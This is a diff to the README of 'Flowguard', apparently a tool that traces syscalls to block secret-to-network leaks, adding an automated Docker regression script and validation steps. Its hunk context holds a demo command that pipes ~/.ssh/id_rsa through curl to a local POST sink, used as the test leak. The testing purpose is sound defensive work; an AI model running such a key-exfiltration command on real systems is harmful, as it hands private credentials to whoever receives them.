@@ -72,13 +72,60 @@ cat /home/user/.ssh/id_rsa | curl -sS -X POST --data-binary @- http://host.docke
 
 Flowguard observes the syscalls with `strace`, builds the provenance graph, blocks the `SecretToNetwork` policy violation, and dumps the violation log plus graph files.
 
-### 1. Build The Observer Image
+### Automated Regression
+
+Run the full POC regression with one command:
+
+```sh
+bash scripts/run_observe_poc.sh
+```
+
+The script:
+- builds the Docker observer image
+- starts a local POST sink on a free host port
+- runs the observed `cat secret | curl` leak inside Docker
+- asserts Flowguard exits with `Block`
+- asserts the report contains `SecretToNetwork`, a `Send` sink, and the explanation path
+- dumps `logs/secret-to-network-regression.violation.log`
+- dumps `logs/secret-to-network-regression.graph.dot`
+- dumps `logs/secret-to-network-regression.graph.mmd`
+- dumps `logs/secret-to-network-regression.raw.strace`
+- dumps `logs/secret-to-network-regression.report.json`
+
+Useful environment overrides:
+
+```sh
+FLOWGUARD_SKIP_DOCKER_BUILD=1 bash scripts/run_observe_poc.sh
+FLOWGUARD_POC_NAME=my-run bash scripts/run_observe_poc.sh
+FLOWGUARD_POC_PORT=18000 bash scripts/run_observe_poc.sh
+FLOWGUARD_DOCKER_EXTRA_ARGS='--add-host=host.docker.internal:host-gateway' bash scripts/run_observe_poc.sh
+```
+
+### Validation Commands
+
+Use the fast Rust suite for normal development:
+
+```sh
+cargo test
+```
+
+Use the Docker-backed POC regression before demo changes or observer changes:
+
+```sh
+bash scripts/run_observe_poc.sh
+```
+
+The Docker regression is intentionally not part of `cargo test` because it requires Docker, host networking to a local POST sink, and `strace` inside the observer image.
+
+### Manual Steps
+
+#### 1. Build The Observer Image
 
 ```sh
 docker build -f docker/observer.Dockerfile -t flowguard-observer .
 ```
 
-### 2. Start A Local POST Sink
+#### 2. Start A Local POST Sink
 
 Run this in terminal 1:
 
@@ -102,7 +149,7 @@ HTTPServer(("0.0.0.0", 18000), Handler).serve_forever()
 '
 ```
 
-### 3. Run The Observed Leak
+#### 3. Run The Observed Leak
 
 Run this in terminal 2:
 
@@ -128,7 +175,7 @@ On Linux, if `host.docker.internal` is not available, add this to the `docker ru
 --add-host=host.docker.internal:host-gateway
 ```
 
-### 4. Dump The Violation Log And Graph
+#### 4. Dump The Violation Log And Graph
 
 ```sh
 python3 scripts/dump_observe_report.py \
